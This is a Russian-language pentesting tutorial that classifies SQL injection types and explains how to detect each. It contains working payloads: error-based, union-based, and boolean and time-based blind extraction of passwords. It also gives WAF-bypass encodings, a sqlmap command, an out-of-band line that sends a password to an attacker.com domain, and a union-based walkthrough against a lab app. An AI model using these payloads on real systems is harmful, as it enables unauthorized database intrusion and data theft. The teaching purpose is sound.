# Типы SQL Injection: Классификация, механизмы эксплуатации и методы обнаружения

SQL Injection (SQLi) — это уязвимость веб-приложений и баз данных, возникающая при внедрении произвольного SQL-кода в запросы, формируемые приложением. Уязвимость возникает не из-за самой СУБД, а из-за нарушения принципа разделения кода и данных: приложение воспринимает пользовательский ввод как часть исполняемого кода. В контексте тестирования на проникновение классификация SQLi критически важна для выбора вектора атаки, так как различные типы инъекций требуют разных условий среды, инструментов и методов обхода защитных механизмов.

## Контекст и базовые понятия

SQL Injection относится к категории атак на уровень приложения (OWASP Top 10) и позволяет злоумышленнику нарушить целостность, конфиденциальность и доступность данных. Ключевое разграничение в теме «Типы SQLi» проводится по двум осям: по **методу передачи данных** (как инъекция попадает в запрос) и по **механизму извлечения данных** (как результат возвращается или используется).

Путаница часто возникает между терминами «Blind SQLi» и «Error-based SQLi». Ошибочное понимание заключается в том, что они являются взаимоисключающими типами. На практике они являются методами *обратной связи* (feedback channels). Один и тот же вектор инъекции (например, в параметре GET-запроса) может быть как Error-based, если СУБД возвращает ошибки, так и Blind, если ошибки подавлены, но приложение реагирует на результат запроса изменением состояния или времени отклика.

Ниже приведена сравнительная таблица, фиксирующая ключевые разграничения между основными типами SQLi по методу эксплуатации.

| Тип SQLi | Механизм передачи данных | Метод извлечения информации | Требования к среде | Индикатор наличия |
|---|---|---|---|---|
| **In-band (Classic)** | Прямое внедрение в параметр запроса (URL, форма, заголовок). | **Error-based**: Ошибки СУБД выводятся в ответ. <br> **Union-based**: Результат внедряется в `UNION SELECT`. | Доступ к результатам выполнения запроса в HTTP-ответе. | Ошибки SQL в HTML; изменение структуры таблицы в ответе. |
| **Inferential (Blind)** | То же, что и In-band. | **Boolean-based**: Логический ответ (True/False) через изменение контента. <br> **Time-based**: Задержка выполнения (`SLEEP`, `WAITFOR`). | Отсутствие прямой обратной связи. Наличие косвенных признаков. | Изменение страницы при изменении условия; задержка ответа. |
| **Out-of-band (OOB)** | Внедрение в запрос, инициирующий внешний вызов. | DNS-запросы, HTTP-запросы к внешнему серверу (GCS, S3, HTTP). | Возможность СУБД выполнять внешние сетевые вызовы. | Логи на внешнем DNS/HTTP сервере. |

Разграничение по **методу извлечения** является наиболее важным для пентестера. In-band позволяет получить данные быстро, но требует уязвимости в отображении ошибок или структуры ответа. Blind требует автоматизации (например, через инструменты вроде SQLmap) и занимает больше времени, но работает в условиях жесткого логирования или скрытых ошибок. OOB используется в сложных случаях, когда приложение полностью изолировано от обратной связи, но позволяет СУБД выходить в сеть.

## Внутреннее устройство предмета

Для полного понимания атаки необходимо рассмотреть архитектуру процесса формирования SQL-запроса и классификацию векторов внедрения. SQLi не является единым событием, а представляет собой цепочку: **Ввод → Парсинг → Конкатенация → Выполнение**. Уязвимость возникает на этапе конкатенации, когда строковый ввод объединяется с кодом запроса без экранирования.

### Классификация векторов внедрения (по месту инъекции)

Вектор определяет, где именно в SQL-запросе происходит разрыв контекста. Это диктует синтаксис полезной нагрузки (payload).

1.  **Строчные (String-based) инъекции**: Самый распространенный тип. Ввод обрамлен одинарными кавычками `'`.
    *   *Механизм*: `SELECT * FROM users WHERE name = '` + `user_input` + `'`.
    *   *Задача атакующего*: Закрыть кавычку (`'`), добавить комментарий (`--` или `#`), чтобы игнорировать остаток запроса.
    *   *Пример*: `' OR 1=1--`.

2.  **Числовые (Numeric-based) инъекции**: Ввод не обрамлен кавычками.
    *   *Механизм*: `SELECT * FROM products WHERE id = ` + `user_input`.
    *   *Задача атакующего*: Не нужно закрывать кавычку. Можно сразу внедрять логику.
    *   *Пример*: `1 OR 1=1`.

3.  **Заголовочные (Header-based) инъекции**: Ввод находится в HTTP-заголовках (User-Agent, Cookie, X-Forwarded-For).
    *   *Особенность*: Часто требует обхода WAF, так как заголовки реже фильтруются, но сложнее для ручного тестирования.
    *   *Пример*: Внедрение в Cookie `session_id=' OR 1=1--`.

4.  **Вторичные (Secondary) инъекции**: Ввод сохраняется в БД как безопасный, но извлекается и выполняется в другом контексте позже.
    *   *Механизм*: Атакующий сохраняет `' OR 1=1--` в поле профиля. При последующем запросе к этому полю (например, при поиске) код выполняется.

### Классификация методов извлечения (по каналу обратной связи)

#### 1. Error-based SQLi
Использует ошибки парсинга или выполнения СУБД для вывода данных.
*   *Механизм*: Атакующий внедряет функцию, которая вызывает ошибку, содержащую желаемые данные (например, `CONCAT()` в MySQL или `CAST()` в PostgreSQL).
*   *Ограничение*: Работает только если приложение выводит полные ошибки SQL. В современных приложениях это редкость, но возможно при неправильной конфигурации отладки.
*   *Пример (MySQL)*: `AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)`.

#### 2. Union-based SQLi
Использует оператор `UNION` для объединения результатов двух запросов.
*   *Механизм*: Первый запрос возвращает пустой результат, второй — данные из другой таблицы.
*   *Требования*:
    1.  Совпадение количества столбцов в обоих запросах.
    2.  Совпадение типов данных столбцов.
*   *Определение количества столбцов*: Обычно методом `ORDER BY` или `UNION SELECT NULL`.
*   *Определение типа данных*: Подстановкой значений разных типов в `UNION SELECT`.

#### 3. Blind SQLi (Inferential)
Используется, когда нет прямой обратной связи. Делится на два подвида:

*   **Boolean-based Blind**:
    *   *Механизм*: Атакующий отправляет запрос с логическим условием. Ответ приложения меняется (например, текст "Welcome" исчезает), если условие истинно.
    *   *Скорость*: Медленная, требует много запросов.
    *   *Пример*: `' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--`.

*   **Time-based Blind**:
    *   *Механизм*: Атакующий заставляет СУБД выполнить задержку, если условие истинно.
    *   *Команды*: `SLEEP()` (MySQL), `WAITFOR DELAY` (SQL Server), `pg_sleep()` (PostgreSQL).
    *   *Пример*: `' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a', SLEEP(5), 0)--`.

#### 4. Out-of-band (OOB) SQLi
Используется, когда ни In-band, ни Blind не работают эффективно (например, из-за таймаутов или блокировки ответов).
*   *Механизм*: СУБД выполняет внешний вызов, данные передаются через DNS или HTTP.
*   *Инструменты*: `LOAD_FILE()` в MySQL (чтение файла на веб-сервер), `UTL_HTTP` в Oracle, `xp_cmdshell` в SQL Server.
*   *Пример (DNS)*: `SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password), '.attacker.com/test'))`.

### Сравнительная таблица методов извлечения данных

| Характеристика | Error-based | Union-based | Boolean Blind | Time-based Blind | OOB |
|---|---|---|---|---|---|
| **Скорость** | Высокая | Высокая | Низкая | Низкая | Средняя |
| **Надежность** | Низкая (зависит от логов) | Высокая | Средняя | Высокая | Низкая (зависит от сети) |
| **Обнаружение** | Легко | Легко | Сложно | Сложно | Сложно |
| **Требования** | Вывод ошибок | Совпадение типов/кол-ва | Логическая разница | Таймауты | Внешний доступ СУБД |
| **Типичные СУБД** | MySQL, PostgreSQL | MySQL, PostgreSQL | Все | Все | MySQL, Oracle, MSSQL |

## Применение и работа с предметом

На практике тестирование на проникновение SQLi требует системного подхода. Ручное тестирование эффективно для понимания контекста, но автоматизация необходима для Blind-инъекций.

### Инструментарий и методы обнаружения

1.  **Ручное тестирование (Manual Testing)**:
    *   *Шаг 1*: Идентификация точек ввода (URL параметры, формы, заголовки, JSON-тела).
    *   *Шаг 2*: Проверка на наличие уязвимости путем изменения синтаксиса.
    *   *Шаг 3*: Определение типа СУБД по ошибкам или специфичным функциям.
    *   *Шаг 4*: Определение количества столбцов (`ORDER BY`).
    *   *Шаг 5*: Выбор метода извлечения (Union, Blind, Error).

2.  **Автоматизированное тестирование**:
    *   **SQLmap**: Стандарт де-факто. Поддерживает все типы инъекций, обход WAF, доступ к файловой системе и выполнению команд.
        *   *Команда*: `sqlmap -u "http://target.com/page?id=1" --dbs --batch`
        *   *Опции*: `--technique=E` (Error), `U` (Union), `B` (Boolean), `T` (Time), `S` (Stacked).
    *   **Burp Suite**: Используется для ручного перехвата и модификации запросов. Вкладка "Intruder" позволяет проводить brute-force атаки по параметрам.
    *   **Nuclei**: Шаблонный сканер, имеющий шаблоны для известных SQLi векторов.

### Паттерны использования и обхода защит

1.  **Обход WAF (Web Application Firewall)**:
    *   *Кейс*: WAF блокирует `' OR 1=1`.
    *   *Метод*: Использование двойного кодирования (`%25%27`), Unicode-кодирование (`%u0027`), комментарии (`/*!OR*/`), разбивка строки (`CONCAT(0x7e, 0x27)`).
    *   *Пример*: Вместо `'` использовать `CHAR(39)`.

2.  **Обход фильтрации кавычек**:
    *   *Метод*: Использование hex-кодирования строк.
    *   *Пример*: `SELECT * FROM users WHERE name = 0x726f6f74` (где `0x726f6f74` = `root`).

3.  **Вторичные инъекции**:
    *   *Метод*: Внедрение payload в поле, которое затем используется в SQL-запросе без экранирования.
    *   *Пример*: Регистрация пользователя с именем `' OR 1=1--`. При последующем поиске по этому имени система выполняет инъекцию.

### Типичные ошибки и подводные камни

*   **Ошибка предположения**: Пентестер предполагает, что если ошибка не видна, то инъекции нет. На самом деле может работать Blind SQLi.
*   **Ошибка синтаксиса**: Использование MySQL-специфичных функций (`GROUP_CONCAT`) в PostgreSQL или MSSQL без проверки СУБД.
*   **Ошибка тайминга**: Неучет сетевых задержек при Time-based инъекциях. Задержка может быть вызвана не `SLEEP()`, а высокой нагрузкой на сервер.
*   **Ошибка контекста**: Неучет того, что инъекция может быть в части `ORDER BY`, где нельзя использовать `UNION`.

## Сквозной практический пример: Исследование Union-based SQLi в веб-приложении

*Исходные условия*:
*   **Среда**: Локальный Docker-контейнер с уязвимым веб-приложением (DVWA или WebGoat) или тестовый стенд с MySQL 8.0.
*   **Инструменты**: Burp Suite Community, SQLmap, браузер.
*   **Роль**: Пентестер, проводящий ручное тестирование перед автоматизацией.
*   **Сценарий**: Обнаружение и эксплуатация Union-based SQLi в параметре `id` страницы профиля пользователя.

### Шаг 1: Идентификация и проверка на уязвимость

Действие: Пентестер открывает страницу профиля `http://target.com/profile?id=1` и пытается нарушить синтаксис запроса, добавляя одинарную кавычку.

```bash
# Запрос в Burp Suite Repeater
GET /profile?id=1' HTTP/1.1
Host: target.com
```

Ожидаемый вывод/результат:
Сервер возвращает HTTP 500 Internal Server Error с сообщением:
`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' at line 1`

*Вывод*: Уязвимость подтверждена. Приложение не экранирует входные данные. Тип — Error-based на этапе обнаружения.

### Шаг 2: Определение количества столбцов

Действие: Для использования `UNION SELECT` необходимо знать количество столбцов в исходном запросе. Пентестер использует оператор `ORDER BY`, увеличивая номер столбца, пока не появится ошибка.

```bash
# Запрос в Burp Suite Repeater
GET /profile?id=1 ORDER BY 1-- - HTTP/1.1
Host: target.com

GET /profile?id=1 ORDER BY 2-- - HTTP/1.1
Host: target.com

GET /profile?id=1 ORDER BY 3-- - HTTP/1.1
Host: target.com

GET /profile?id=1 ORDER BY 4-- - HTTP/1.1
Host: target.com
```

Ожидаемый вывод/результат:
*   `ORDER BY 1`, `2`, `3` возвращают HTTP 200 OK (страница загружается).
*   `ORDER BY 4` возвращает HTTP 500 или пустую страницу.

*Вывод*: Исходный запрос возвращает 3 столбца.

### Шаг 3: Определение типов данных и номера уязвимого столбца

Действие: Пентестер использует `UNION SELECT` с различными типами данных (строка, число, дата), чтобы найти столбец, который может отобразить строку (обычно это текстовые поля).

```bash
# Запрос в Burp Suite Repeater
GET /profile?id=-1 UNION SELECT 1, 2, 3-- - HTTP/1.1
Host: target.com
```

Ожидаемый вывод/результат:
На странице профиля вместо имени пользователя отображаются числа `1`, `2`, `3`. Это означает, что все три столбца могут отображать строковые представления чисел. Номер `-1` используется, чтобы исходный запрос (с `id=1`) не вернул результатов, и только результаты `UNION` были видны.

*Вывод*: Уязвимые столбцы для вывода данных — 1, 2, 3.

### Шаг 4: Извлечение данных (версия СУБД и пользователи)

Действие: Пентестер использует функции СУБД для вывода информации в уязвимые столбцы.

```bash
# Запрос в Burp Suite Repeater
GET /profile?id=-1 UNION SELECT version(), user(), database()-- - HTTP/1.1
Host: target.com
```

Ожидаемый вывод/результат:
На странице отображается:
`8.0.32` | `root@localhost` | `dvwa`

*Вывод*: Получена версия MySQL, имя пользователя и база данных.

### Шаг 5: Извлечение таблиц и данных

Действие: Пентестер запрашивает список таблиц из `information_schema.tables`.

```bash
# Запрос в Burp Suite Repeater
GET /profile?id=-1 UNION SELECT table_name, NULL, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1-- - HTTP/1.1
Host: target.com
```

Ожидаемый вывод/результат:
На странице отображается имя первой таблицы, например, `users`.

*Вывод*: Пентестер может итеративно перебирать таблицы, изменяя `LIMIT`, чтобы получить полный список, а затем извлечь данные из таблицы `users` (логин, пароль).

## Аналитический вывод

SQL Injection остается одной из наиболее критичных уязвимостей, несмотря на наличие механизмов защиты. Классификация типов SQLi (In-band, Blind, OOB) позволяет пентестеру адаптировать стратегию атаки под конкретные условия среды: наличие ошибок, структуру ответа и сетевые ограничения. Union-based инъекции предоставляют наиболее прямой путь к извлечению данных, но требуют точного знания структуры запроса. Blind инъекции, хотя и медленнее, являются универсальным методом, работающим в условиях скрытых ошибок. Ошибки разработчиков, такие как конкатенация строк вместо использования подготовленных выражений (prepared statements), остаются основной причиной возникновения SQLi. Для защиты необходимо применять параметризованные запросы на уровне кода, а не полагаться на экранирование на уровне приложения или WAF.
